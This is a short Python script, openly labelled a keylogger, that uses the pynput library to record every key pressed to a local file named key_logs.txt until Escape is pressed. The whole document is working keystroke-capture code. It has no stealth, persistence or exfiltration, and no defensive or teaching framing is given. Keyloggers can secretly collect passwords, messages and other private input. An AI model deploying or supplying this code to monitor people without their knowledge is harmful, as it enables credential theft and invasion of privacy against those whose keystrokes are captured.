from pynput import keyboard

# Output file
output_file = "./key_logs.txt"


# Function to write key logs to the output file
def on_press(key):
    try:
        with open(output_file, "a") as f:
            f.write(key.char)
    # If the key is not a character, then it is a special key
    except AttributeError:
        with open(output_file, "a") as f:
            f.write(f"\n[{key}] pressed\n")


# Function to stop the keylogger when the escape key is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        return False


# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
